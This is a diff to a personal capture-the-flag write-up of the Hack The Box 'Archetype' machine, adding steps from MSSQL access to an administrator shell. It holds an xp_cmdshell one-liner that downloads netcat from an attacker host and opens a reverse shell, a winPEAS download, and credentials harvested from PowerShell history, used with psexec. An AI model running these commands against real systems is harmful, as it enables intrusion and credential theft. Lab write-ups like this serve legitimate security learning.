@@ -95,6 +95,8 @@ Impacket is designed to deal with network packets, "providing low-level programm
 kali$ impacket-mssqlclient ARCHETYPE/sql_svc:M3g4c0rp123@$TARGET -windows-auth
 ```
 
+> TODO: Why windows-auth?
+
 **Task 5**  
 What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
 
@@ -110,13 +112,54 @@ What script can be used in order to search possible paths to escalate privileges
 **Task 7**  
 What file contains the administrator's password?
 
-At this point, I can execute commands via `xp_cmdshell`. It seems pertinent to create a reverse shell. This will allow us a more stable connection adn remove the need to type `xp_cmdshell` on every line.
+At this point, I can execute commands via `xp_cmdshell`. It seems pertinent to create a reverse shell. This will allow us a more stable connection and remove the need to type `xp_cmdshell` on every line. From the writeups I researched online, it seems like the answer to this question only comes by solving the next two tasks (including obtaining a reverse shell, looking for privesc opportunities, and the like). After all of that, the answer is `ConsoleHost_History.txt` in the `~/AppData/Roaming/...PSReadline/` folder
 
-*From a quick geeze through the writeup, it looks like there is a common pattern to download certain executables to the target machine - this includes things like nc.exe for the reverse shell, and winpeas for the privesc. We'll come back to the next time*
 
 **Task 8**  
 Submit user flag
 
+```
+# Kali
+kali$ python3 -m http.server 80 &
+kali$ nc -lvnp 443
+
+# mssql client
+mssql> xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget 10.10.15.212/nc.exe -outfile nc.exe; .\nc.exe -e cmd.exe 10.10.15.212 443"
+
+# Kali netcat session (reverse shell)
+C:\Users\sql_svc\Downloads> type ..\Desktop\user.txt
+3e7b102e78218e935bf3f4951fec21a3
+```
 
 **Task 9**  
 Submit root flag
+
+Now that we have a reverse shell, we can download winPEAS from our attacking machine
+
+```
+C:\Users\sql_svc\Downloads> powershell -c wget http://10.10.15.212/winPEASx64.exe -outfile winPEASx64.exe
+C:\Users\sql_svc\Downloads> .\winPEASx64.exe
+```
+
+Looking through the output of winPEAS, we can take a look for anything interesting that we could easily leverage. Unfortunately for me, unlike the writeup for the box, winPEAS did not suggest the `ConsoleHost_History.txt` file. In any case, looking at the file, we find some credentials, as seen below. To gain admin, we can use the `runas` command
+
+TODO: more research on ConsoleHost_History.txt fle
+
+```cmd
+C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine>type ConsoleHost_history.txt
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+exit
+```
+
+From here, I tried to make use of a `runas` command, however it would not let me type in a password. As a result, I instead used impacket's `psexec` script.
+
+```
+kali$ impacket-psexec administrator@$TARGET
+
+Password: ***
+
+C:\Windows\system32> whoami
+nt authority\system
+C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
+b91ccec3305e98240082d4474b848528
+```
